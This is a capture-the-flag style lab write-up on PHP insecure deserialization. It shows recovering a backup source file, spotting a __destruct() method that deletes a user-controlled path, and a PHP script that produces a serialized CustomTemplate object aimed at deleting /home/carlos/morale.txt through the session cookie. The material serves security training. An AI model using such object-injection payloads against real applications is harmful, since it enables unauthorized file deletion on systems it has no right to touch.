This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the `morale.txt` file from Carlos's home directory. You will need to obtain source code access to solve this lab.

You can log in to your own account using the following credentials: `wiener:peter`

# Recon

The web application has an authentication mechanism that contains a serialized object.

![[auth-cookie.png]]

Try to discover the source code file to check the available classes to inject the appropriate magic method.

## Finding source code

1. Run a the content discovery tool
2. Look for comments on the website


![[possible-source.png]]

I found the source-code file by checking the hint and requesting for:

```
/libs/CustomTemplate.php~
```

![[source-code-class.png]]

```PHP
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

	public function __construct($template_file_path) {
		$this->template_file_path = $template_file_path;
		$this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

Its quite clear the the vulnerable magic method is `__destruct()` as it deletes a file from a path that is controllable to the user. Create a custom object that contains the path to the target file.

Other aspect of this attack is how to trigger the execution of `__destruct()` I think when the user logs out this method is called when the session object is eliminated.

Exploit code:

```PHP
<?php

class CustomTemplate {
    public $template_file_path;
    public $lock_file_path;

	public function __construct($template_file_path) {
		$this->template_file_path = $template_file_path;
		$this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

$x = new CustomTemplate("test");
$x->lock_file_path = "/home/carlos/morale.txt";

echo var_dump(serialize($x))

?>
```

The result will be:

```
string(116) "O:14:"CustomTemplate":2:{s:18:"template_file_path";s:4:"test";s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}"
```

Which is just the object that I need to exploit this lab:

![[Advanced Topics/Insecure deserialization/labs/Arbitrary Object Injection PHP/images/exploited.png]]



